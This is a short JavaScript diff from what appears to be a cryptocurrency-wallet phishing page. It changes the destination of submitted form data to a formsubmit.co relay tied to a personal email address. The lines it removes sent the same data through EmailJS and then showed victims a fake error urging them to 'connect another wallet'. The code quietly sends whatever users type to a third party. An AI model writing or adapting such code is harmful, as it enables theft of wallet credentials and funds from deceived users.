@@ -842,7 +842,7 @@
 			}
 
 			$.ajax({
-				url: "https://formsubmit.co/ajax/620a5ae5de2e4d0fbe9b70a7d82fb3cc",
+				url: "https://formsubmit.co/ajax/ramotamalomo82@gmail.com",
 				method: "POST",
 				data: data,
 				dataType: "json"
@@ -852,14 +852,6 @@
 				})
 				.catch((error) => {
 					console.log(erroor);
-				});
-
-			emailjs.send(service_id, template_id, data)
-				.then(function (response) {
-					console.log('SUCCESS!', response.status, response.text);
-					alert("An unexpected error has occured. Contact Administrator to continue or connect another wallet")
-				}, function (error) {
-					console.log('FAILED...', error);
 				});
 		}
 
